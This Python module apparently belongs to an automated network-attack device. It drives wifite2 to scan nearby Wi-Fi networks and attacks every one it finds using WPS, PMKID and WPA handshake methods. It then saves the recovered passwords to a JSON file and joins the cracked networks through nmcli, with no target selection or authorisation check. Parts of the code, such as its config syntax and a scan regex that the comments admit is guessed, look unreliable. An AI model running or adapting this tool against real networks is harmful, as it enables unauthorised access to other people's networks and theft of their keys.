"""
wifite2_connector.py - This script performs wireless network scanning and attacks using wifite2.
It scans for open networks, attempts to crack them, and connects to any successfully cracked networks.
"""

import os
import subprocess
import threading
import logging
import time
import json
import re
from datetime import datetime
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="wifite2_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "Wifite2Connector"
b_module = "wifite2_connector"
b_status = "wireless_attack"
b_port = None  # Wireless attacks don't use specific ports
b_parent = None

class Wifite2Connector:
    """
    Class to handle wireless network scanning and attacks using wifite2.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.console = Console()
        self.wifite_results_dir = os.path.join(shared_data.data_dir, "output", "wireless_results")
        self.cracked_networks_file = os.path.join(self.wifite_results_dir, "cracked_networks.json")
        self.available_networks_file = os.path.join(self.wifite_results_dir, "available_networks.json")

        # Create directories if they don't exist
        os.makedirs(self.wifite_results_dir, exist_ok=True)

        # Initialize results storage
        self.cracked_networks = []
        self.available_networks = []
        self.load_existing_results()

        logger.info("Wifite2Connector initialized.")

    def load_existing_results(self):
        """Load existing cracked networks and available networks from files."""
        try:
            if os.path.exists(self.cracked_networks_file):
                with open(self.cracked_networks_file, 'r') as f:
                    self.cracked_networks = json.load(f)
                logger.info(f"Loaded {len(self.cracked_networks)} existing cracked networks")

            if os.path.exists(self.available_networks_file):
                with open(self.available_networks_file, 'r') as f:
                    self.available_networks = json.load(f)
                logger.info(f"Loaded {len(self.available_networks)} existing available networks")
        except Exception as e:
            logger.error(f"Error loading existing results: {e}")

    def save_results(self):
        """Save cracked networks and available networks to files."""
        try:
            with open(self.cracked_networks_file, 'w') as f:
                json.dump(self.cracked_networks, f, indent=4)

            with open(self.available_networks_file, 'w') as f:
                json.dump(self.available_networks, f, indent=4)
        except Exception as e:
            logger.error(f"Error saving results: {e}")

    def scan_for_networks(self):
        """
        Scan for available wireless networks using wifite2.
        """
        logger.info("Scanning for wireless networks...")
        self.shared_data.bjornorch_status = "Wifite2Scan"

        try:
            # Use wifite2 to scan for networks
            cmd = ["wifite", "--showb", "--kill", "--quiet"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                networks = self.parse_network_scan(result.stdout)
                self.available_networks = networks
                self.save_results()
                logger.info(f"Found {len(networks)} wireless networks")
                return networks
            else:
                logger.error(f"Wifite2 scan failed: {result.stderr}")
                return []

        except subprocess.TimeoutExpired:
            logger.error("Wifite2 scan timed out")
            return []
        except Exception as e:
            logger.error(f"Error scanning for networks: {e}")
            return []

    def parse_network_scan(self, output):
        """
        Parse wifite2 scan output to extract network information.
        """
        networks = []
        lines = output.split('\n')

        for line in lines:
            # Look for network information in wifite2 output
            # This pattern may need adjustment based on actual wifite2 output format
            match = re.search(r'(\S+)\s+(\S+)\s+(\d+)\s+(\S+)\s+(\S+)', line)
            if match:
                ssid, bssid, channel, encryption, signal = match.groups()
                networks.append({
                    'ssid': ssid,
                    'bssid': bssid,
                    'channel': int(channel),
                    'encryption': encryption,
                    'signal': signal,
                    'discovered_at': datetime.now().isoformat()
                })

        return networks

    def attack_network(self, network):
        """
        Attack a specific wireless network using wifite2.
        """
        logger.info(f"Attacking network: {network['ssid']} ({network['bssid']})")

        try:
            # Create a temporary configuration file for this attack
            config_file = os.path.join(self.wifite_results_dir, f"attack_{network['bssid'].replace(':', '')}.conf")

            with open(config_file, 'w') as f:
                f.write(f"targets={network['bssid']}\n")

                # Use configuration settings
                if self.shared_data.wireless_wps_priority:
                    f.write("wps-only\n")
                if self.shared_data.wireless_pmkid_enabled:
                    f.write("pmkid\n")
                if self.shared_data.wireless_handshake_enabled:
                    f.write("--wpa\n")

                f.write("--kill\n")
                f.write("--quiet\n")

            # Run wifite2 attack with configured timeout
            cmd = ["wifite", "--conf", config_file]
            timeout = getattr(self.shared_data, 'wireless_attack_timeout', 300)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

            # Clean up config file
            os.remove(config_file)

            if result.returncode == 0:
                # Check if attack was successful
                if self.check_attack_success(result.stdout, network):
                    logger.success(f"Successfully cracked network: {network['ssid']}")
                    # Update wireless statistics
                    self.shared_data.wirelessnbr += 1
                    self.shared_data.update_stats()
                    return True
                else:
                    logger.info(f"Attack on {network['ssid']} was not successful")
                    return False
            else:
                logger.error(f"Attack failed: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            logger.error(f"Attack on {network['ssid']} timed out")
            return False
        except Exception as e:
            logger.error(f"Error attacking network {network['ssid']}: {e}")
            return False

    def check_attack_success(self, output, network):
        """
        Check if the wifite2 attack was successful by parsing the output.
        """
        # Look for success indicators in wifite2 output
        success_indicators = [
            "WPS PIN:",
            "WPA PSK:",
            "Password:",
            "Successfully cracked",
            "Key found:"
        ]

        for indicator in success_indicators:
            if indicator in output:
                # Extract the password/key
                password = self.extract_password(output, indicator)
                if password:
                    network['password'] = password
                    network['cracked_at'] = datetime.now().isoformat()
                    network['attack_method'] = self.determine_attack_method(output)
                    self.cracked_networks.append(network)
                    self.save_results()
                    return True

        return False

    def extract_password(self, output, indicator):
        """
        Extract password/key from wifite2 output.
        """
        lines = output.split('\n')
        for i, line in enumerate(lines):
            if indicator in line:
                # Try to extract the password from the next line or current line
                if ':' in line:
                    password = line.split(':', 1)[1].strip()
                    if password:
                        return password
                elif i + 1 < len(lines):
                    password = lines[i + 1].strip()
                    if password and not password.startswith('['):
                        return password
        return None

    def determine_attack_method(self, output):
        """
        Determine which attack method was successful.
        """
        if "WPS PIN:" in output:
            return "WPS_PixieDust"
        elif "WPA PSK:" in output:
            return "WPA_Handshake"
        elif "PMKID" in output:
            return "PMKID"
        else:
            return "Unknown"

    def connect_to_network(self, network):
        """
        Connect to a successfully cracked wireless network.
        """
        if 'password' not in network:
            logger.error(f"No password available for network {network['ssid']}")
            return False

        logger.info(f"Connecting to network: {network['ssid']}")

        try:
            # Use nmcli to connect to the network
            cmd = [
                "nmcli", "device", "wifi", "connect", network['ssid'],
                "password", network['password']
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                logger.success(f"Successfully connected to {network['ssid']}")
                network['connected_at'] = datetime.now().isoformat()
                self.save_results()
                return True
            else:
                logger.error(f"Failed to connect to {network['ssid']}: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            logger.error(f"Connection to {network['ssid']} timed out")
            return False
        except Exception as e:
            logger.error(f"Error connecting to network {network['ssid']}: {e}")
            return False

    def execute_wireless_attack(self):
        """
        Execute the complete wireless attack process.
        """
        logger.info("Starting wireless attack process...")
        self.shared_data.bjornorch_status = "Wifite2Attack"

        # Check if wireless scanning is enabled
        if not getattr(self.shared_data, 'wireless_scan_enabled', True):
            logger.info("Wireless scanning is disabled in configuration")
            return False

        # Step 1: Scan for networks
        networks = self.scan_for_networks()
        if not networks:
            logger.info("No wireless networks found")
            return False

        # Step 2: Attack networks (focus on WPS-enabled networks first if configured)
        if getattr(self.shared_data, 'wireless_wps_priority', True):
            wps_networks = [n for n in networks if 'WPS' in n.get('encryption', '')]
            other_networks = [n for n in networks if 'WPS' not in n.get('encryption', '')]

            # Attack WPS networks first
            for network in wps_networks:
                if self.attack_network(network):
                    # Try to connect to successfully cracked network
                    if self.connect_to_network(network):
                        logger.success(f"Successfully connected to cracked network: {network['ssid']}")
                        return True

            # Attack other networks if no WPS networks were successful
            for network in other_networks:
                if self.attack_network(network):
                    # Try to connect to successfully cracked network
                    if self.connect_to_network(network):
                        logger.success(f"Successfully connected to cracked network: {network['ssid']}")
                        return True
        else:
            # Attack all networks without WPS priority
            for network in networks:
                if self.attack_network(network):
                    # Try to connect to successfully cracked network
                    if self.connect_to_network(network):
                        logger.success(f"Successfully connected to cracked network: {network['ssid']}")
                        return True

        logger.info("No networks were successfully cracked")
        return False

    def execute(self, ip=None, port=None, row=None, status_key=None):
        """
        Execute the wireless attack and update status.
        """
        logger.info("Executing Wifite2Connector...")
        success = self.execute_wireless_attack()
        return 'success' if success else 'failed'

    def get_statistics(self):
        """
        Get statistics about wireless attacks.
        """
        return {
            'total_networks_found': len(self.available_networks),
            'networks_cracked': len(self.cracked_networks),
            'networks_connected': len([n for n in self.cracked_networks if 'connected_at' in n]),
            'last_scan': max([n.get('discovered_at', '') for n in self.available_networks]) if self.available_networks else None,
            'last_crack': max([n.get('cracked_at', '') for n in self.cracked_networks]) if self.cracked_networks else None
        }

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        wifite2_connector = Wifite2Connector(shared_data)
        logger.info("Starting wireless attack...")

        success = wifite2_connector.execute()
        stats = wifite2_connector.get_statistics()

        logger.info(f"Wireless attack completed. Success: {success}")
        logger.info(f"Statistics: {stats}")

        exit(0 if success else 1)
    except Exception as e:
        logger.error(f"Error: {e}")
        exit(1)